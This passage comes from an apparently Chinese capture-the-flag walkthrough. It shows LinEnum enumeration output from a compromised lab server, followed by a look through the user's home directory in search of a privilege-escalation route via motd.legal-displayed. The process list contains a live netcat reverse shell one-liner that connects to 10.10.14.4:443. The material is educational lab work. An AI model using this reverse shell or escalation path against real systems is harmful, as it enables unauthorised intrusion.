Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br>tcp6       0      0 :::80                   :::*                    LISTEN      -               <br>tcp6       0      0 :::22                   :::*                    LISTEN      -               <br><br><br>[-] Listening UDP:<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               <br><br><br><span class="hljs-comment">### SERVICES #############################################</span><br>[-] Running processes:<br>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root         1  0.0  0.1   2528  1416 ?        Ss   14:48   0:01 /sbin/init<br>root         2  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kthreadd]<br>root         3  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [migration/0]<br>root         4  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksoftirqd/0]<br>root         5  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [watchdog/0]<br>root         6  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [events/0]<br>root         7  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [cpuset]<br>root         8  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [khelper]<br>root         9  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [netns]<br>root        10  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [async/mgr]<br>root        11  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kintegrityd/0]<br>root        12  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kblockd/0]<br>root        13  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpid]<br>root        14  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpi_notify]<br>root        15  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpi_hotplug]<br>root        16  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ata/0]<br>root        17  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ata_aux]<br>root        18  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksuspend_usbd]<br>root        19  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [khubd]<br>root        20  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kseriod]<br>root        21  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmmcd]<br>root        22  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [bluetooth]<br>root        23  0.0  0.0      0     0 ?        S    14:48   0:00 [khungtaskd]<br>root        24  0.0  0.0      0     0 ?        S    14:48   0:00 [pdflush]<br>root        25  0.0  0.0      0     0 ?        S    14:48   0:00 [pdflush]<br>root        26  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kswapd0]<br>root        27  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [aio/0]<br>root        28  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ecryptfs-kthrea]<br>root        29  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [crypto/0]<br>root        32  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [pciehpd]<br>root        34  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_0]<br>root        35  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_1]<br>root        36  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_2]<br>root        37  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_3]<br>root        38  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_4]<br>root        39  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_5]<br>root        40  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_6]<br>root        41  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_7]<br>root        42  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_8]<br>root        43  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_9]<br>root        44  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_10]<br>root        45  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_11]<br>root        46  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_12]<br>root        47  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_13]<br>root        48  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_14]<br>root        49  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_15]<br>root        50  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_16]<br>root        51  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_17]<br>root        52  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_18]<br>root        53  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_19]<br>root        54  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_20]<br>root        55  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_21]<br>root        56  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_22]<br>root        57  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_23]<br>root        58  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_24]<br>root        59  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_25]<br>root        60  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_26]<br>root        61  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_27]<br>root        62  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_28]<br>root        63  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_29]<br>root        64  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_30]<br>root        66  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_31]<br>root        68  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kstriped]<br>root        70  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmpathd/0]<br>root        72  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmpath_handlerd]<br>root        74  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksnapd]<br>root        76  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kondemand/0]<br>root        78  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kconservative/0]<br>root        80  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [krfcommd]<br>root       202  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [mpt_poll_0]<br>root       293  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [mpt/0]<br>root       417  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_32]<br>root       432  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kdmflush]<br>root       434  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kdmflush]<br>root       524  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kjournald2]<br>root       574  0.0  0.0   2284   836 ?        S    14:48   0:00 upstart-udev-bridge --daemon<br>root       577  0.0  0.1   2768  1224 ?        S&lt;s  14:48   0:00 udevd --daemon<br>root       777  0.0  0.1   2764  1184 ?        S&lt;   14:48   0:00 udevd --daemon<br>root       778  0.0  0.1   2764  1184 ?        S&lt;   14:48   0:00 udevd --daemon<br>root       820  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kpsmoused]<br>root       878  0.0  0.0   1852   544 ?        Ss   14:48   0:00 <span class="hljs-built_in">dd</span> bs=1 <span class="hljs-keyword">if</span>=/proc/kmsg of=/var/run/rsyslog/kmsg<br>syslog     921  0.0  0.1  33528  1536 ?        Sl   14:48   0:00 rsyslogd -c4<br>root      1075  0.0  0.0   1704   544 tty4     Ss+  14:48   0:00 /sbin/getty -8 38400 tty4<br>root      1082  0.0  0.0   1704   544 tty5     Ss+  14:48   0:00 /sbin/getty -8 38400 tty5<br>root      1085  0.0  0.0   1704   544 tty2     Ss+  14:48   0:00 /sbin/getty -8 38400 tty2<br>root      1086  0.0  0.0   1704   540 tty3     Ss+  14:48   0:00 /sbin/getty -8 38400 tty3<br>root      1088  0.0  0.0   1704   548 tty6     Ss+  14:48   0:00 /sbin/getty -8 38400 tty6<br>root      1096  0.0  0.0   2092   872 ?        Ss   14:48   0:00 cron<br>daemon    1097  0.0  0.0   1964   420 ?        Ss   14:48   0:00 atd<br>root      1239  0.0  0.0   1752   536 ?        S    14:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root      1279  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [vmmemctl]<br>mysql     1485  0.0  1.8 147236 18740 ?        Sl   14:48   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>root      1487  0.0  0.0   1668   548 ?        S    14:48   0:00 logger -t mysqld -p daemon.error<br>root      1637  0.0  0.6  33324  6980 ?        Ss   14:48   0:00 /usr/sbin/apache2 -k start<br>root      1657  0.0  0.0   1704   548 tty1     Ss+  14:48   0:00 /sbin/getty -8 38400 tty1<br>root      1659  0.0  0.3  17008  3812 ?        Sl   14:48   0:05 /usr/sbin/vmtoolsd<br>root      1697  0.0  0.7  13752  7680 ?        S    14:48   0:00 /usr/lib/vmware-vgauth/VGAuthService -s<br>root      1717  0.0  0.0   2144   304 ?        Ss   14:48   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0<br>root      1767  0.0  0.1   5436  1076 ?        Ss   14:48   0:00 /usr/sbin/sshd<br>www-data  1840  0.0  0.7  34180  7348 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1843  0.0  0.7  34228  8040 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1844  0.0  0.7  34244  7536 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1854  0.0  0.7  34208  7504 ?        S    15:17   0:00 /usr/sbin/apache2 -k start<br>www-data  1859  0.0  0.7  34308  7572 ?        S    15:18   0:00 /usr/sbin/apache2 -k start<br>www-data  1868  0.0  0.6  34040  6752 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1869  0.0  0.4  33908  4708 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1870  0.0  0.6  34068  6936 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1871  0.0  0.6  33908  6728 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1889  0.0  0.6  33672  6284 ?        S    15:46   0:00 /usr/sbin/apache2 -k start<br>www-data  1890  0.0  0.0   1752   488 ?        S    15:57   0:00 sh -c <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.4 443 &gt;/tmp/f<br>www-data  1893  0.0  0.0   1704   412 ?        S    15:57   0:00 <span class="hljs-built_in">cat</span> /tmp/f<br>www-data  1894  0.0  0.0   1752   504 ?        S    15:57   0:00 sh -i<br>www-data  1895  0.0  0.0   1724   608 ?        S    15:57   0:00 nc 10.10.14.4 443<br>www-data  1956  0.5  0.1   3348  1692 ?        S    16:31   0:00 /bin/bash ./LinEnum.sh<br>www-data  1957  0.0  0.1   3876  1588 ?        R    16:31   0:00 /bin/bash ./LinEnum.sh<br>www-data  1959  0.0  0.0   1688   444 ?        R    16:31   0:00 <span class="hljs-built_in">tee</span> -a<br>www-data  2187  0.0  0.1   3876  1288 ?        R    16:31   0:00 /bin/bash ./LinEnum.sh<br>www-data  2188  0.0  0.0   2364   920 ?        R    16:31   0:00 ps aux<br><br><br>[-] Process binaries and associated permissions (from above list):<br>-rwxr-xr-x 1 root root  875596 Sep 14  2009 /bin/bash<br>lrwxrwxrwx 1 root root       4 Mar 17  2017 /bin/sh -&gt; dash<br>-rwxr-xr-x 1 root root   18360 Oct 23  2009 /sbin/getty<br>-rwxr-xr-x 1 root root  169676 Oct 15  2009 /sbin/init<br>lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/lib/vmware-vgauth/VGAuthService -&gt; /usr/lib/vmware-tools/bin32/appLoader<br>lrwxrwxrwx 1 root root      34 Mar 17  2017 /usr/sbin/apache2 -&gt; ../lib/apache2/mpm-prefork/apache2<br>-rwxr-xr-x 1 root root 8376232 Nov 10  2010 /usr/sbin/mysqld<br>-rwxr-xr-x 1 root root  414304 Oct 22  2009 /usr/sbin/sshd<br>lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/sbin/vmtoolsd -&gt; /usr/lib/vmware-tools/sbin32/vmtoolsd<br><br><br>[-] /etc/init.d/ binary permissions:<br>total 184<br>drwxr-xr-x  2 root root  4096 Oct 26  2020 .<br>drwxr-xr-x 87 root root  4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root    24 Mar 17  2017 .depend.boot<br>-rw-r--r--  1 root root    24 Mar 17  2017 .depend.start<br>-rw-r--r--  1 root root    10 Mar 17  2017 .depend.stop<br>-rw-r--r--  1 root root     0 Mar 17  2017 .legacy-bootordering<br>-rw-r--r--  1 root root 12288 Oct 14  2009 .umountroot.swp<br>-rw-r--r--  1 root root  1510 Sep  7  2009 README<br>-rwxr-xr-x  1 root root  6461 Nov 18  2010 apache2<br>-rwxr-xr-x  1 root root  3314 Oct 17  2009 apparmor<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 apport -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 atd -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  2341 Sep  7  2009 bootlogd<br>-rwxr-xr-x  1 root root  1670 Jul  6  2009 console-setup<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 cron -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 dmesg -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  1235 Feb 20  2009 dns-clean<br>-rwxr-xr-x  1 root root  1105 Oct 24  2009 grub-common<br>-rwxr-xr-x  1 root root  1329 Sep  7  2009 halt<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock-save -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  1404 Jul  6  2009 keyboard-setup<br>-rwxr-xr-x  1 root root  1293 Sep  7  2009 killprocs<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 module-init-tools -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  5609 Nov 10  2010 mysql<br>-rwxr-xr-x  1 root root  2070 Sep 15  2009 networking<br>-rwxr-xr-x  1 root root   882 Sep  7  2009 ondemand<br>-rwxr-xr-x  1 root root   420 Feb 20  2009 pppd-dns<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 procps -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  8863 Sep  7  2009 rc<br>-rwxr-xr-x  1 root root   801 Sep  7  2009 rc.local<br>-rwxr-xr-x  1 root root   117 Sep  7  2009 rcS<br>-rwxr-xr-x  1 root root   639 Sep  7  2009 reboot<br>-rwxr-xr-x  1 root root  4310 Jun 25  2009 rsync<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog-kmsg -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  1055 Jul  6  2009 screen-cleanup<br>-rwxr-xr-x  1 root root  2283 Sep  7  2009 sendsigs<br>-rwxr-xr-x  1 root root   590 Sep  7  2009 single<br>-rw-r--r--  1 root root  4271 Sep  7  2009 skeleton<br>-rwxr-xr-x  1 root root  3878 Oct 22  2009 ssh<br>-rwxr-xr-x  1 root root   519 Sep  7  2009 stop-bootlogd<br>-rwxr-xr-x  1 root root  1095 Sep  7  2009 stop-bootlogd-single<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 udev -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 udev-finish -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 udevmonitor -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 udevtrigger -&gt; /lib/init/upstart-job<br>lrwxrwxrwx  1 root root    21 Mar 17  2017 ufw -&gt; /lib/init/upstart-job<br>-rwxr-xr-x  1 root root  2746 Oct 14  2009 umountfs<br>-rwxr-xr-x  1 root root  2075 Oct 14  2009 umountnfs.sh<br>-rwxr-xr-x  1 root root  1683 Oct 14  2009 umountroot<br>-rwxr-xr-x  1 root root  1997 Sep  7  2009 urandom<br>-rwxr-xr-x  1 root root  2327 Sep 20  2009 wpa-ifupdown<br>-rwxr-xr-x  1 root root  1777 Dec  5  2008 x11-common<br><br><br>[-] /etc/init/ config file permissions:<br>total 144<br>drwxr-xr-x  2 root root 4096 Oct 26  2020 .<br>drwxr-xr-x 87 root root 4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root 1271 Oct 23  2009 apport.conf<br>-rw-r--r--  1 root root  261 Sep 15  2009 atd.conf<br>-rw-r--r--  1 root root  356 Oct 15  2009 control-alt-delete.conf<br>-rw-r--r--  1 root root  297 Sep 15  2009 cron.conf<br>-rw-r--r--  1 root root  273 Oct 15  2009 dmesg.conf<br>-rw-r--r--  1 root root  312 Sep 10  2009 hostname.conf<br>-rw-r--r--  1 root root  444 Oct 23  2009 hwclock-save.conf<br>-rw-r--r--  1 root root  557 Oct 23  2009 hwclock.conf<br>-rw-r--r--  1 root root  367 Sep 16  2009 module-init-tools.conf<br>-rw-r--r--  1 root root  335 Oct 26  2009 mountall-net.conf<br>-rw-r--r--  1 root root  261 Oct 26  2009 mountall-reboot.conf<br>-rw-r--r--  1 root root 1073 Oct 26  2009 mountall-shell.conf<br>-rw-r--r--  1 root root  793 Oct 26  2009 mountall.conf<br>-rw-r--r--  1 root root  493 Sep 14  2009 network-interface.conf<br>-rw-r--r--  1 root root  290 Sep 15  2009 networking.conf<br>-rw-r--r--  1 root root  293 Sep 16  2009 procps.conf<br>-rw-r--r--  1 root root 1453 Oct 15  2009 rc-sysinit.conf<br>-rw-r--r--  1 root root  354 Oct 15  2009 rc.conf<br>-rw-r--r--  1 root root  822 Oct 15  2009 rcS.conf<br>-rw-r--r--  1 root root  589 Oct 15  2009 rsyslog-kmsg.conf<br>-rw-r--r--  1 root root  280 Oct 15  2009 rsyslog.conf<br>-rw-r--r--  1 root root  228 Oct 15  2009 tty1.conf<br>-rw-r--r--  1 root root  213 Oct 15  2009 tty2.conf<br>-rw-r--r--  1 root root  213 Oct 15  2009 tty3.conf<br>-rw-r--r--  1 root root  213 Oct 15  2009 tty4.conf<br>-rw-r--r--  1 root root  213 Oct 15  2009 tty5.conf<br>-rw-r--r--  1 root root  213 Oct 15  2009 tty6.conf<br>-rw-r--r--  1 root root  769 Sep 22  2009 udev-finish.conf<br>-rw-r--r--  1 root root  316 Sep 22  2009 udev.conf<br>-rw-r--r--  1 root root  356 Sep 22  2009 udevmonitor.conf<br>-rw-r--r--  1 root root  318 Sep 22  2009 udevtrigger.conf<br>-rw-r--r--  1 root root  344 Sep 24  2009 ufw.conf<br>-rw-r--r--  1 root root  313 Oct 15  2009 upstart-udev-bridge.conf<br>-r--r--r--  1 root root  901 Oct 26  2020 vmware-tools.conf<br><br><br><span class="hljs-comment">### SOFTWARE #############################################</span><br>[-] Sudo version:<br>Sudo version 1.7.0<br><br><br>[-] MYSQL version:<br>mysql  Ver 14.14 Distrib 5.1.37, <span class="hljs-keyword">for</span> debian-linux-gnu (i486) using  EditLine wrapper<br><br><br>[-] Apache user configuration:<br>APACHE_RUN_USER=www-data<br>APACHE_RUN_GROUP=www-data<br><br><br><span class="hljs-comment">### INTERESTING FILES ####################################</span><br>[-] Useful file locations:<br>/bin/nc<br>/bin/netcat<br>/usr/bin/wget<br>/usr/bin/gcc<br><br><br>[-] Installed compilers:<br>ii  g++                                 4:4.4.1-1ubuntu2                  The GNU C++ compiler<br>ii  g++-4.4                             4.4.1-4ubuntu9                    The GNU C++ compiler<br>ii  gcc                                 4:4.4.1-1ubuntu2                  The GNU C compiler<br>ii  gcc-4.4                             4.4.1-4ubuntu9                    The GNU C compiler<br><br><br>[-] Can we <span class="hljs-built_in">read</span>/write sensitive files:<br>-rw-r--r-- 1 root root 1031 Mar 17  2017 /etc/passwd<br>-rw-r--r-- 1 root root 691 Mar 17  2017 /etc/group<br>-rw-r--r-- 1 root root 497 Mar 17  2017 /etc/profile<br>-rw-r----- 1 root shadow 838 Mar 17  2017 /etc/shadow<br><br><br>[-] SUID files:<br>-rwsr-xr-x 1 root root 30492 May 12  2009 /bin/ping6<br>-rwsr-xr-x 1 root root 34696 May 12  2009 /bin/ping<br>-rwsr-xr-x 1 root root 47096 Oct 23  2009 /bin/umount<br>-rwsr-xr-x 1 root root 72188 Oct 23  2009 /bin/mount<br>-rwsr-xr-x 1 root root 22064 Mar  5  2009 /bin/fusermount<br>-rwsr-xr-x 1 root root 31124 Jul 31  2009 /bin/su<br>-rwsr-xr-x 1 root root 9548 Jan 11  2011 /usr/lib/pt_chown<br>-r-sr-xr-x 1 root root 9532 Oct 26  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>-r-sr-xr-x 1 root root 14320 Oct 26  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>-rwsr-xr-x 1 root root 5544 Apr 29  2009 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 179120 Oct 22  2009 /usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 40332 Jul 31  2009 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 30936 Jul 31  2009 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 52036 Nov  5  2008 /usr/bin/mtr<br>-rwsr-xr-x 1 root root 31756 Jul 31  2009 /usr/bin/chsh<br>-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudo<br>-rwsr-xr-x 1 root root 13948 May 12  2009 /usr/bin/traceroute6.iputils<br>-rwsr-xr-x 1 root root 41292 Jul 31  2009 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 13816 May 12  2009 /usr/bin/arping<br>-rwsr-xr-x 1 root root 57964 Jul 31  2009 /usr/bin/gpasswd<br>-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudoedit<br>-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at<br>-rwsr-xr-- 1 root dip 277352 Feb 20  2009 /usr/sbin/pppd<br>-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd<br><br><br>[-] SGID files:<br>-rwxr-sr-x 1 root shadow 30400 Sep  4  2009 /sbin/unix_chkpwd<br>-rwxr-sr-x 1 root mlocate 34408 Apr 29  2009 /usr/bin/mlocate<br>-rwxr-sr-x 1 root ssh 79912 Oct 22  2009 /usr/bin/ssh-agent<br>-rwxr-sr-x 1 root crontab 31712 Sep 15  2009 /usr/bin/crontab<br>-rwxr-sr-x 1 root shadow 57580 Jul 31  2009 /usr/bin/chage<br>-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-lock<br>-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-unlock<br>-rwxr-sr-x 1 root <span class="hljs-built_in">tty</span> 13864 Oct 23  2009 /usr/bin/wall<br>-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-touchlock<br>-rwxr-sr-x 1 root <span class="hljs-built_in">tty</span> 9704 May  9  2009 /usr/bin/bsd-write<br>-rwxr-sr-x 1 root mail 14280 Nov 18  2008 /usr/bin/dotlockfile<br>-rwxr-sr-x 1 root utmp 361080 Jul  6  2009 /usr/bin/screen<br>-rwxr-sr-x 1 root shadow 18128 Jul 31  2009 /usr/bin/expiry<br>-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at<br>-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd<br><br><br>[-] Can<span class="hljs-string">&#x27;t search *.conf files as no keyword was entered</span><br><span class="hljs-string"></span><br><span class="hljs-string">[-] Can&#x27;</span>t search *.php files as no keyword was entered<br><br>[-] Can<span class="hljs-string">&#x27;t search *.log files as no keyword was entered</span><br><span class="hljs-string"></span><br><span class="hljs-string">[-] Can&#x27;</span>t search *.ini files as no keyword was entered<br><br>[-] All *.conf files <span class="hljs-keyword">in</span> /etc (recursive 1 level):<br>-rw-r--r-- 1 root root 34 Mar 17  2017 /etc/ld.so.conf<br>-rw-r--r-- 1 root root 1173 Oct 15  2009 /etc/rsyslog.conf<br>-rw-r--r-- 1 root root 92 Apr 27  2009 /etc/host.conf<br>-rw-r--r-- 1 root root 248 Apr 29  2009 /etc/updatedb.conf<br>-rw-r--r-- 1 root root 599 Aug 20  2009 /etc/logrotate.conf<br>-rw-r--r-- 1 root root 4794 Oct  6  2009 /etc/hdparm.conf<br>-rw-r--r-- 1 root root 2986 Mar 17  2017 /etc/adduser.conf<br>-rw-r--r-- 1 root root 350 Mar 17  2017 /etc/popularity-contest.conf<br>-rw-r--r-- 1 root root 600 Aug  3  2009 /etc/deluser.conf<br>-rw-r--r-- 1 root root 2969 Oct  2  2009 /etc/debconf.conf<br>-rw-r--r-- 1 root root 126 Oct  1  2020 /etc/cvs-pserver.conf<br>-rw-r--r-- 1 root root 240 Mar 17  2017 /etc/kernel-img.conf<br>-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf<br>-rw-r--r-- 1 root root 85 Oct  1  2020 /etc/resolv.conf<br>-rw-r--r-- 1 root root 2277 Sep 16  2009 /etc/sysctl.conf<br>-rw-r--r-- 1 root root 89 Oct  1  2020 /etc/cvs-cron.conf<br>-rw-r----- 1 root fuse 216 Mar  5  2009 /etc/fuse.conf<br>-rw-r--r-- 1 root root 645 May  2  2009 /etc/ts.conf<br>-rw-r--r-- 1 root root 6332 Mar 17  2017 /etc/ca-certificates.conf<br>-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf<br>-rw-r--r-- 1 root root 885 Sep  7  2009 /etc/insserv.conf<br>-rw-r--r-- 1 root root 801 Oct 24  2009 /etc/mke2fs.conf<br>-rw-r--r-- 1 root root 321 Oct 23  2009 /etc/blkid.conf<br>-rw-r--r-- 1 root root 552 Sep  4  2009 /etc/pam.conf<br>-rw-r--r-- 1 root root 475 Aug 28  2006 /etc/nsswitch.conf<br>-rw-r--r-- 1 root root 2689 Mar 27  2008 /etc/gai.conf<br><br><br>[-] Location and contents (<span class="hljs-keyword">if</span> accessible) of .bash_history file(s):<br>/home/george/.bash_history<br><br><br>[-] Any interesting mail <span class="hljs-keyword">in</span> /var/mail:<br>total 8<br>drwxrwsr-x  2 root mail 4096 Mar 17  2017 .<br>drwxr-xr-x 15 root root 4096 Oct 26 15:16 ..<br><br><br><span class="hljs-comment">### SCAN COMPLETE ####################################</span><br>$ <span class="hljs-built_in">cat</span> /home/george/.bash_history<br>$ <br></code></pre></td></tr></table></figure>

<p>25、到这里依旧没什么思路，然后通过查看演练报告，发现还是在用户根目录这里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <br>$ <span class="hljs-built_in">cd</span> /home/george/<br>$ <span class="hljs-built_in">ls</span> -la<br>total 860<br>drwxr-xr-x 3 george george   4096 Oct 26 14:57 .<br>drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..<br>lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout<br>-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc<br>drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache<br>-rw-r--r-- 1 george george    675 Mar 17  2017 .profile<br>-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful<br>-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip<br>-rw-r--r-- 1 george george     33 Jan  2 14:48 user.txt<br>$ <span class="hljs-built_in">cd</span> .cache<br>$ <span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxr-xr-x 2 george george 4096 Mar 17  2017 .<br>drwxr-xr-x 3 george george 4096 Oct 26 14:57 ..<br>-rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed<br>$ <span class="hljs-built_in">cat</span> motd.legal-displayed<br>$ <br></code></pre></td></tr></table></figure>

<p>26、而存在提权的关键就是这个motd.legal-displayed文件，使用谷歌百度相关漏洞</p>
